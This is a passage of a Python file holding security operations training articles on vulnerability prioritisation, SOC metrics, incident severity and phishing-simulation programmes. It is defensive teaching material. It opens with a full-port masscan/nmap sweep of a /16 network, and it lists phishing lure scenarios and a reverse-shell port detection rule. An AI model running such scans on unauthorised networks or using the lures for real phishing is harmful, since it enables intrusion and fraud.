masscan -p 1-65535 10.0.0.0/16 --rate 1000 -oG masscan_results.txt
nmap -sV -iL masscan_results.txt -oX service_scan.xml
```

## CVSS Scoring

CVSS (Common Vulnerability Scoring System) provides a standardised severity score (0-10):

```
CVSS v3.1 Base Score calculation:
- Attack Vector (Network/Adjacent/Local/Physical)
- Attack Complexity (Low/High)
- Privileges Required (None/Low/High)
- User Interaction (None/Required)
- Scope (Unchanged/Changed)
- Confidentiality Impact (None/Low/High)
- Integrity Impact (None/Low/High)
- Availability Impact (None/Low/High)

Score ranges:
0.0        = None
0.1 - 3.9  = Low
4.0 - 6.9  = Medium
7.0 - 8.9  = High
9.0 - 10.0 = Critical

CVSS is a starting point, not the whole story.
A CVSS 7.5 vulnerability on an unpatched internet-facing server
beats a CVSS 9.8 vulnerability on an air-gapped legacy system.
```

## Risk-Based Prioritisation

CVSS alone is insufficient. Layer in:

```python
def calculate_priority_score(vuln: dict) -> float:
    '''Multi-factor vulnerability priority scoring.'''
    score = 0.0

    # Base severity (CVSS)
    cvss = vuln.get("cvss_score", 0)
    score += cvss * 3

    # Is it exploitable in the wild? (CISA KEV, Exploit DB, threat intel)
    if vuln.get("exploited_in_wild"):
        score += 30

    # Is there a public PoC exploit?
    if vuln.get("public_exploit"):
        score += 15

    # Asset criticality
    asset_criticality = vuln.get("asset_criticality", "medium")  # low/medium/high/critical
    criticality_multiplier = {"low": 0.5, "medium": 1.0, "high": 1.5, "critical": 2.0}
    score *= criticality_multiplier.get(asset_criticality, 1.0)

    # Internet-facing asset?
    if vuln.get("internet_facing"):
        score *= 1.5

    # Has the vulnerability been on the network for > 30 days?
    age_days = vuln.get("age_days", 0)
    if age_days > 30:
        score *= 1.2

    return round(score, 1)

# Example usage
vuln = {
    "name": "Log4Shell",
    "cvss_score": 10.0,
    "exploited_in_wild": True,
    "public_exploit": True,
    "asset_criticality": "critical",
    "internet_facing": True,
    "age_days": 3,
}
print(f"Priority score: {calculate_priority_score(vuln)}")  # Very high
```

**CISA Known Exploited Vulnerabilities (KEV) Catalogue:**
```bash
# Download and check against your vuln list
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json |
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for vuln in data['vulnerabilities']:
    if vuln['cveID'] in ['CVE-2023-44487', 'CVE-2021-44228']:  # Example CVE list
        print(vuln['cveID'], vuln['vulnerabilityName'], vuln['dueDate'])
"
```

## Remediation Workflow

```
Vulnerability found (Scanner)
        |
        v
Ticket created (Jira/ServiceNow) with:
  - CVE, affected asset, CVSS, priority score
  - Remediation deadline (SLA by severity):
      Critical: 24 hours (if exploited in wild) or 7 days
      High: 14 days
      Medium: 30 days
      Low: 90 days
        |
        v
Asset owner notified (automated email from VM tool)
        |
        v
Patching or mitigation applied
        |
        v
Re-scan to verify remediation (rescan ticket)
        |
        v
Ticket closed / exception documented
```

## Exception Management

Not every vulnerability can be patched immediately (legacy systems, vendor dependency, operational constraints):

```
Exception types:
- Accept Risk: Vulnerability acknowledged, mitigating controls exist
- Compensating Control: Can't patch; deploy WAF rule, network segmentation, or EDR rule
- Defer: Patch in next maintenance window (max 30 days extension for High/Critical)
- False Positive: Scanner error; verified not applicable

Exception documentation must include:
- Who approved the exception (risk owner, CISO for Critical)
- Justification
- Compensating controls in place
- Review date (maximum 90 days for High/Critical)
```

## Vulnerability Management Metrics

```python
vm_metrics = {
    # Coverage
    "assets_scanned_pct": 0,          # % of known assets scanned in last 30 days
    "scan_frequency_compliance": 0,   # % meeting required scan frequency

    # Remediation performance (SLA compliance)
    "critical_within_sla_pct": 0,     # Critical vulns remediated within 7 days
    "high_within_sla_pct": 0,         # High within 14 days
    "medium_within_sla_pct": 0,       # Medium within 30 days

    # Risk posture
    "open_critical_count": 0,
    "open_high_count": 0,
    "mean_time_to_remediate_critical_days": 0,
    "kev_coverage_pct": 0,            # % of CISA KEV catalogue applicable to env patched

    # Trends
    "vuln_count_30d_ago": 0,
    "vuln_count_today": 0,            # Trending up = falling behind; down = progress
}
```
""",
    },
    {
        "title": "Security Metrics and KPIs — MTTD, MTTR, Alert Volume, and Coverage",
        "tags": ["metrics", "kpis", "mttd", "mttr", "soc", "reporting", "secops"],
        "content": """# Security Metrics and KPIs — MTTD, MTTR, Alert Volume, and Coverage

## Why Metrics Matter

"You can't manage what you don't measure." Security metrics quantify the effectiveness of the SOC, identify improvement areas, justify budget, and demonstrate value to leadership. Good metrics are specific, measurable, achievable, relevant, and time-bound (SMART).

## Core Detection and Response Metrics

### MTTD — Mean Time to Detect

The average time between when an attack begins and when the SOC detects it.

```python
from datetime import datetime

def calculate_mttd(incidents: list) -> float:
    \"""
    incidents: list of dicts with 'attack_start' and 'first_detection' timestamps
    Returns: MTTD in hours
    \"""
    detection_times = []
    for inc in incidents:
        start = datetime.fromisoformat(inc["attack_start"])
        detected = datetime.fromisoformat(inc["first_detection"])
        hours = (detected - start).total_seconds() / 3600
        detection_times.append(hours)
    return sum(detection_times) / len(detection_times) if detection_times else 0

# Industry benchmarks (IBM X-Force Threat Intelligence Index 2024):
# Global average MTTD: ~200 days (breach to detection)
# SOC with EDR + SIEM: target < 1 hour for endpoint threats
# World-class SOC: <15 minutes for P1 threats
```

### MTTR — Mean Time to Respond/Remediate

Time from detection to containment of the threat.

```python
def calculate_mttr(incidents: list) -> float:
    \"""
    incidents: list of dicts with 'first_detection' and 'contained_at' timestamps
    Returns: MTTR in hours
    \"""
    response_times = []
    for inc in incidents:
        detected = datetime.fromisoformat(inc["first_detection"])
        contained = datetime.fromisoformat(inc["contained_at"])
        hours = (contained - detected).total_seconds() / 3600
        response_times.append(hours)
    return sum(response_times) / len(response_times) if response_times else 0

# Target SLAs:
# P1 (Critical): Contained within 4 hours
# P2 (High): Contained within 24 hours
# P3 (Medium): Contained within 72 hours
```

### Mean Time to Acknowledge (MTTA)

Time from alert creation to analyst first action:

```
P1: < 15 minutes
P2: < 1 hour
P3: < 4 hours
P4: Next business day
```

## Alert Volume and Quality Metrics

```python
# Weekly alert quality dashboard
weekly_report = {
    "total_alerts": 1250,
    "triaged": 1200,
    "triaged_pct": 96.0,

    # Alert outcomes
    "true_positives": 45,
    "false_positives": 1080,
    "benign_true_positives": 75,
    "tp_rate_pct": 3.75,              # TP / total -- low % is normal for high-volume SOCs

    # By severity
    "p1_alerts": 12,
    "p2_alerts": 87,
    "p3_alerts": 451,
    "p4_alerts": 700,

    # SLA compliance
    "p1_within_sla_pct": 100,
    "p2_within_sla_pct": 94.3,
    "p3_within_sla_pct": 88.1,

    # Incidents opened
    "incidents_opened": 23,
    "incidents_closed": 18,

    # Top FP rules (prime tuning targets)
    "top_fp_rules": [
        {"rule": "Scheduled Task Created", "fp_count": 234, "fp_rate_pct": 98.7},
        {"rule": "PowerShell Script Block", "fp_count": 189, "fp_rate_pct": 95.2},
        {"rule": "Network Connection Port 4444", "fp_count": 67, "fp_rate_pct": 89.3},
    ],
}
```

## Detection Coverage Metrics

Coverage maps which MITRE ATT&CK techniques your current detection capabilities address:

```python
# MITRE ATT&CK coverage tracking
coverage = {
    "total_enterprise_techniques": 201,  # Current ATT&CK version
    "techniques_with_detection": 87,
    "coverage_pct": 43.3,               # Target: >60% for mature SOC

    # By tactic
    "initial_access":       {"total": 10, "covered": 7, "pct": 70.0},
    "execution":            {"total": 14, "covered": 10, "pct": 71.4},
    "persistence":          {"total": 20, "covered": 12, "pct": 60.0},
    "privilege_escalation": {"total": 14, "covered": 9,  "pct": 64.3},
    "defence_evasion":      {"total": 43, "covered": 15, "pct": 34.9},  # Hardest to cover
    "credential_access":    {"total": 17, "covered": 11, "pct": 64.7},
    "lateral_movement":     {"total": 10, "covered": 6,  "pct": 60.0},
    "collection":           {"total": 17, "covered": 5,  "pct": 29.4},
    "command_and_control":  {"total": 18, "covered": 8,  "pct": 44.4},
    "exfiltration":         {"total": 9,  "covered": 4,  "pct": 44.4},
    "impact":               {"total": 15, "covered": 5,  "pct": 33.3},
}

# Identify gaps for detection engineering backlog
uncovered_high_priority = [
    "T1055 - Process Injection",         # Defence Evasion
    "T1562 - Impair Defences",           # Defence Evasion
    "T1190 - Exploit Public-Facing App", # Initial Access
    "T1041 - Exfiltration over C2",      # Exfiltration
]
```

## Log Source Health

Monitoring that your log sources are actually sending:

```python
import requests
from datetime import datetime, timedelta, timezone

def get_source_health(es_url: str, auth: tuple) -> list:
    sources = [
        ("windows_security", "logs-windows.security-*"),
        ("edr", "logs-endpoint.events.*"),
        ("firewall", "logs-network.firewall-*"),
        ("dns", "logs-network.dns-*"),
        ("email_gateway", "logs-email-*"),
    ]

    report = []
    for name, index in sources:
        r = requests.post(
            f"{es_url}/{index}/_count",
            json={"query": {"range": {"@timestamp": {"gte": "now-1h"}}}},
            auth=auth, verify=True, timeout=10
        )
        count = r.json().get("count", 0) if r.ok else -1
        r2 = requests.post(
            f"{es_url}/{index}/_count",
            json={"query": {"range": {"@timestamp": {"gte": "now-25h","lte": "now-23h"}}}},
            auth=auth, verify=True, timeout=10
        )
        baseline = r2.json().get("count", 0) if r2.ok else 0
        pct_change = ((count - baseline) / baseline * 100) if baseline > 0 else 0

        report.append({
            "source": name,
            "last_1h_events": count,
            "baseline_1h_events": baseline,
            "pct_change": round(pct_change, 1),
            "status": "WARNING" if count < baseline * 0.5 else "OK",
        })
    return report
```

## SOC Productivity Metrics

```
Per-Analyst Metrics (daily):
- Alerts handled: 30-80 (depending on tool quality and shift length)
- Average triage time: 5-15 minutes per alert
- Incidents investigated: 1-5
- Escalations: 0-3

SOC Shift Metrics:
- Alert queue length at shift start vs end
- Carry-over alerts (should be zero for P1/P2)
- Shift handover quality (documented, contextualised)

Monthly SOC Health:
- Total incidents: trend over time
- P1/P2 incident rate: should be declining if programme is maturing
- Analyst attrition rate: >20%/year suggests burnout issues
- Training hours per analyst: >40h/year recommended
- Threat hunting exercises completed: 1-2/month minimum
```

## Reporting to Leadership

Security metrics for executives should be risk-focused, not technical:

```
Executive Dashboard — Monthly Security Report

Risk Posture:
  - Security Score: 74/100 (up from 68 last month)
  - Critical vulnerabilities unpatched > 7 days: 2 (down from 8)
  - Coverage of top 10 threat actor TTPs: 73%

Incident Summary:
  - Incidents this month: 12
  - P1/P2 incidents: 2 (both contained within SLA)
  - Mean time to detect: 23 minutes (target: <60 min) [GREEN]
  - Mean time to respond: 3.2 hours (target: <4 hours) [GREEN]

Compliance:
  - GDPR data requests resolved within 30 days: 100%
  - PCI-DSS vulnerability SLA compliance: 94%

Investment impact:
  - Phishing simulation click rate: 12% (down from 31% 6 months ago)
  - EDR coverage of endpoints: 98% (up from 89%)
```
""",
    },
    {
        "title": "Incident Classification and Severity Matrix",
        "tags": ["incident-response", "classification", "severity", "soc", "secops"],
        "content": """# Incident Classification and Severity Matrix

## Why Classification Matters

Classification determines response urgency, resource allocation, escalation path, and reporting requirements. Inconsistent classification means P1-level threats sit in the P3 queue while the SOC investigates low-risk anomalies at emergency pace.

## Incident Classification Types

```
Category               Examples
-----------            --------
Malware                Ransomware, cryptominer, botnet agent, RAT, spyware
Phishing               Credential harvesting, BEC, spear-phishing, vishing
Unauthorised Access    Compromised account, insider threat, exposed credentials
Data Breach            PII exfiltration, database dump, accidental exposure
Denial of Service      DDoS, resource exhaustion, ransomware (system unavailability)
Vulnerability          Exploitation of unpatched system, zero-day
Insider Threat         Data theft, sabotage, policy violation
Supply Chain           Compromised vendor, malicious update, third-party breach
Physical Security      Tailgating, laptop theft, badge cloning
Policy Violation       Unapproved software, data handling violation
```

## Severity Matrix

```python
# Severity decision matrix
# Consider: impact (what is affected?) x urgency (how fast is it spreading?)

SEVERITY_MATRIX = {
    "P1_CRITICAL": {
        "description": "Imminent or active catastrophic impact",
        "examples": [
            "Ransomware actively encrypting production systems",
            "Confirmed data exfiltration of regulated data (PII/PHI/PCI)",
            "Active compromise of AD/domain controller",
            "Critical infrastructure systems compromised",
            "Zero-day exploitation with active lateral movement",
        ],
        "response_sla": {
            "acknowledge": "15 minutes",
            "initial_triage": "30 minutes",
            "containment": "4 hours",
            "escalation": "Immediate (CISO, management)",
        },
        "team": "All available analysts + senior IR",
    },

    "P2_HIGH": {
        "description": "Significant impact or high breach probability",
        "examples": [
            "Confirmed account compromise of privileged user",
            "Malware on a high-value target (server, exec workstation)",
            "Active C2 communication from an endpoint",
            "Exploitation attempt on public-facing application",
            "Suspicious bulk data access by an employee",
        ],
        "response_sla": {
            "acknowledge": "1 hour",
            "initial_triage": "2 hours",
            "containment": "24 hours",
            "escalation": "SOC lead + security manager",
        },
        "team": "Primary analyst + SOC lead",
    },

    "P3_MEDIUM": {
        "description": "Moderate impact, possible precursor to higher severity",
        "examples": [
            "Phishing email clicked (no payload executed)",
            "Failed brute force attack (no success)",
            "Malware detected and quarantined by EDR",
            "Policy violation (unauthorised software, USB use)",
            "Single failed privileged access attempt",
        ],
        "response_sla": {
            "acknowledge": "4 hours",
            "initial_triage": "8 hours",
            "containment": "72 hours",
            "escalation": "SOC lead if escalation needed",
        },
        "team": "Primary analyst",
    },

    "P4_LOW": {
        "description": "Minimal impact, informational, routine hygiene",
        "examples": [
            "Spam email detected",
            "Port scan from external IP (single, no success)",
            "Routine vulnerability scan from authorised scanner",
            "Antivirus PUA detection (cleaned automatically)",
            "Failed login attempts on a non-existent account",
        ],
        "response_sla": {
            "acknowledge": "Next business day",
            "initial_triage": "48 hours",
            "containment": "None required",
            "escalation": "Only if pattern changes",
        },
        "team": "L1 analyst (batch processing)",
    },
}
```

## Severity Escalation Triggers

An incident's severity can change as investigation reveals more context:

```
Escalate to P1 when:
- Confirmed lateral movement (attacker on multiple systems)
- Domain admin / Tier 0 credentials compromised
- Ransomware confirmed on ANY production system
- Evidence of data exfiltration of regulated data
- Any indication of critical infrastructure impact

Escalate to P2 when:
- Single system confirmed compromised (high-value asset)
- Privileged account credential confirmed stolen
- Active C2 beacon identified
- Evidence of attacker persistence (scheduled task, service created)

Downgrade severity when:
- Confirmed false positive / benign true positive
- Threat contained (isolated), no lateral movement
- Investigation complete, no further action needed
```

## Classification in Practice: Decision Tree

```
Security Event Detected
        |
        v
Is it affecting production systems or regulated data?
        |
        +-- YES: Is it causing or likely to cause service disruption or data loss?
        |           |
        |           +-- YES: P1 Critical
        |           +-- NO:  Is a privileged account involved?
        |                       |
        |                       +-- YES: P2 High
        |                       +-- NO:  P2 High (active threat, production scope)
        |
        +-- NO: Is it a confirmed compromise (malware active, credentials stolen)?
                    |
                    +-- YES: Is it a server or high-value endpoint?
                    |           |
                    |           +-- YES: P2 High
                    |           +-- NO:  P3 Medium
                    +-- NO: P3 Medium (phishing, FTP, policy violation)
                            or P4 Low (automated/routine)
```

## Breach Notification Decision

Not every incident is a reportable breach:

```
Incident occurs
      |
      v
Does it involve personal data (GDPR) / PHI (HIPAA) / PAN (PCI)?
      |
      +-- NO: Internal incident management only
      |
      +-- YES: Was the data encrypted with a valid, uncompromised key?
                    |
                    +-- YES: HIPAA safe harbour / GDPR low-risk -- likely no notification
                    +-- NO:  Assess risk to individuals
                                  |
                                  +-- HIGH RISK: Notify individuals + authority (72h GDPR)
                                  +-- LOWER RISK: Notify authority only (72h GDPR)
                                  +-- NEGLIGIBLE: Document only

PCI-DSS: Notify your acquiring bank and card brands immediately for any cardholder data breach.
```

## Post-Incident Review

Every P1/P2 incident should result in a Post-Incident Review (PIR):

```
PIR Structure:
1. Incident summary (what happened, timeline, scope)
2. Root cause analysis (how did attacker get in? what controls failed?)
3. Detection analysis (how was it detected? was MTTD acceptable?)
4. Response analysis (was the MTTR within SLA? what went well/badly?)
5. Action items (remediation, detection improvements, process changes)
6. Lessons learned (what would we do differently?)

Timeline (draft):
Within 24h: Initial PIR draft (facts and timeline)
Within 7 days: Root cause analysis complete
Within 30 days: All action items have owners and due dates
Within 90 days: Action items verified as completed
```
""",
    },
    {
        "title": "Security Awareness Training — Phishing Simulation and Reporting Culture",
        "tags": ["security-awareness", "phishing-simulation", "training", "culture", "human-risk"],
        "content": """# Security Awareness Training — Phishing Simulation and Reporting Culture

## Why Human Risk is the Top Security Risk

Despite technical controls, humans remain the most targeted attack vector. The 2024 Verizon DBIR found that social engineering was a factor in over 70% of breaches. Security awareness training (SAT) attempts to reduce the probability that a human will enable an attack.

## Effective Training Principles

### What Works (Evidence-Based)

```
1. Micro-learning: Short, frequent sessions (5-10 minutes) vs annual 1-hour e-learning
   - Research: retention drops 90% within 7 days of one-time training
   - Better: monthly 5-minute modules, reinforced with real-world examples

2. Just-in-time learning: Training delivered immediately after a near-miss
   - Phishing simulation click -> immediate educational redirect ("teachable moment")
   - Far more effective than classroom training disconnected from behavior

3. Simulated attacks: Regular phishing simulations give experience without real consequences
   - Frequency: monthly (or bi-weekly for high-risk roles)
   - Personalisation: senior executives, finance team, IT admins need different scenarios

4. Positive culture over blame culture:
   - Celebrate "if in doubt, report" behaviour
   - Never shame or punish people who click in simulations
   - Reward early reporters of real phishing
```

### What Doesn't Work

```
- Annual compliance tick-box training only
- Generic, non-tailored content
- Punishment-based approaches (creates fear of reporting mistakes)
- Training that doesn't connect to real-world examples employees recognise
```

## Phishing Simulation Programme

### Simulation Campaign Design

```python
# Phishing simulation campaign planning

SIMULATION_TRACKS = {
    "executive_track": {
        "audience": "C-suite, board members",
        "frequency": "bi-monthly",
        "scenarios": [
            "BEC (business email compromise) impersonating CFO",
            "Fake board portal login request",
            "DocuSign/e-signature lure with credential harvest",
        ],
        "difficulty": "advanced",
    },
    "finance_track": {
        "audience": "Finance, accounts payable",
        "frequency": "monthly",
        "scenarios": [
            "Vendor invoice update requiring bank detail change",
            "Payroll system credential re-verification",
            "Fake tax document from HMRC/IRS",
        ],
        "difficulty": "intermediate",
    },
    "general_staff_track": {
        "audience": "All staff",
        "frequency": "monthly",
        "scenarios": [
            "IT helpdesk: password expiry notification",
            "HR: benefits portal reconfirmation",
            "SharePoint document sharing link",
            "Parcel delivery notification with tracking link",
        ],
        "difficulty": "basic_to_intermediate",
    },
    "it_admin_track": {
        "audience": "IT admins, developers",
        "frequency": "monthly",
        "scenarios": [
            "GitHub notification with malicious OAuth consent",
            "AWS/Azure management console credential reset",
            "Software vendor security update requiring login",
        ],
        "difficulty": "advanced",
    },
}
```

### Simulation Metrics

```python
# GoPhish / KnowBe4 / Proofpoint SAT metrics

def analyse_simulation_results(campaign: dict) -> dict:
    total_sent     = campaign["emails_sent"]
    opened         = campaign["emails_opened"]
    clicked        = campaign["links_clicked"]
    submitted_data = campaign["credentials_submitted"]
    reported       = campaign["emails_reported"]

    return {
        # Click-through rate: primary headline metric
        "click_rate_pct": round(clicked / total_sent * 100, 1),
        "submission_rate_pct": round(submitted_data / total_sent * 100, 1),

        # Reporting is the positive metric -- reward this behaviour
        "report_rate_pct": round(reported / total_sent * 100, 1),
        "resilience_score": round((reported - clicked) / total_sent * 100, 1),

        # Benchmark comparisons (Proofpoint SAT 2024 averages)
        "industry_click_avg_pct": 12.0,
        "vs_industry": "ABOVE" if clicked / total_sent * 100 > 12.0 else "BELOW",
    }

# Target improvement trajectory:
# Month 1:  Click rate 30% (baseline measurement)
# Month 3:  Click rate 20% (initial training impact)
# Month 6:  Click rate 12% (approaching industry average)
# Month 12: Click rate <8% (good awareness culture)
# Mature:   Report rate > click rate (staff actively defending)
```

## Building a Reporting Culture

The most valuable security awareness outcome is a culture where staff confidently report suspicious activity — even if they clicked the link.

### Reporting Mechanisms

```
Make reporting easy:
- One-click "Report Phishing" button in email client (Outlook add-in, Gmail plugin)
- Clear, simple email alias: phishing@corp.com or security@corp.com
- Text/Slack channel for urgent reports
- Anonymous reporting option for insider threat concerns

Response to reports:
- Acknowledge within 30 minutes (automated: "Thank you, we're reviewing")
- Close loop: "The email you reported was/wasn't a phishing simulation/real threat"
  (Closing the loop is critical -- staff won't keep reporting if they hear nothing)

Reward reporting:
- Monthly "Security Champion" recognition for high reporters
- Team leaderboard for reporting vs clicking ratio
- Department-level security awareness scores visible to managers
```

### Anti-patterns to Avoid

```
DO NOT:
- Send simulations during crises or stressful periods (furloughs, redundancy announcements)
  → Poor timing destroys trust
- Make simulations so easy they have no learning value
- Make simulations so hard they feel unfair and create hostility
- Publish individual click data publicly or to managers as punishment
- Send simulations immediately after a real attack (staff under stress)

DO:
- Debrief after real phishing events that reached users
- Celebrate when a simulated or real phishing attempt is widely reported
- Include executives in simulations (models the behaviour for the organisation)
- Share anonymised results company-wide to build collective awareness
```

## Security Awareness Metrics for the SOC

Security awareness training has measurable SOC impact:

```python
# Track these quarterly to demonstrate SAT programme value
sat_impact_metrics = {
    # Phishing resilience
    "phishing_click_rate_pct": {
        "q1_2025": 28.3,
        "q2_2025": 22.1,
        "q3_2025": 16.4,
        "q4_2025": 11.2,
    },
    "phishing_report_rate_pct": {
        "q1_2025": 5.1,
        "q2_2025": 9.3,
        "q3_2025": 14.7,
        "q4_2025": 19.6,
    },

    # SOC impact (fewer incidents from human-initiated events)
    "phishing_incidents_per_quarter": {
        "q1_2025": 23,
        "q2_2025": 19,
        "q3_2025": 14,
        "q4_2025": 9,
    },
    # Early user reports as first detection vector
    "incidents_first_detected_by_user_pct": {
        "q1_2025": 8.0,
        "q2_2025": 15.0,
        "q3_2025": 22.0,
        "q4_2025": 31.0,
    },
}

# When staff report phishing before it's caught by technical controls,
# MTTD drops dramatically and the human layer becomes a detection asset.
```

## Training Content Topics by Role

```
All staff (quarterly):
- Phishing and social engineering recognition
- Password hygiene and MFA
- Safe web browsing
- Data handling and classification
- Incident reporting procedure

IT and Security staff (monthly):
- Latest threat actor TTPs
- Tool-specific security (cloud console, VPN, admin portals)
- Privilege access hygiene
- Secure configuration reminders

Developers (quarterly):
- OWASP Top 10 relevance to their tech stack
- Secure coding practices
- Dependency management
- Secrets management (no hardcoded credentials)

Finance staff (monthly):
- BEC (Business Email Compromise) red flags
- Payment verification procedures
- Dual approval for large transfers
- Suspicious invoice red flags

Executives (bi-monthly):
- Spear-phishing / CEO fraud
- Safe use of personal devices
- Travel security
- Targeted attack awareness
```
""",
    },
]


COLLECTIONS = [
    (
        "Operating System Internals",
        "Windows and Linux OS internals — processes, memory, filesystem, boot chain, IPC, and logging",
        OS_INTERNALS,
    ),
    (
        "Scripting for Security Analysts",
        "PowerShell, Bash, Python, regex, and REST API scripting for SOC and incident response work",
        SECURITY_SCRIPTING,
    ),
    (
        "Virtualization & Cloud Foundations",
        "Hypervisors, containers, cloud service models, AWS, Azure, Kubernetes, IaC, and serverless security",
        VIRT_CLOUD,
    ),
    (
        "Security Architecture & Design",
        "Zero Trust, network segmentation, email authentication, DNS security, logging pipelines, backups, and endpoint protection",
        SECURITY_ARCHITECTURE,
    ),
    (
        "Data & Database Security",
        "Database hardening, data classification, encryption, DLP, key management, and regulatory compliance",
        DATA_SECURITY,
    ),
    (
        "Security Operations Foundations",
        "SIEM architecture, alert triage, threat intelligence, vulnerability management, metrics, incident classification, and security awareness",
        SECOPS_FOUNDATIONS,
    ),
]
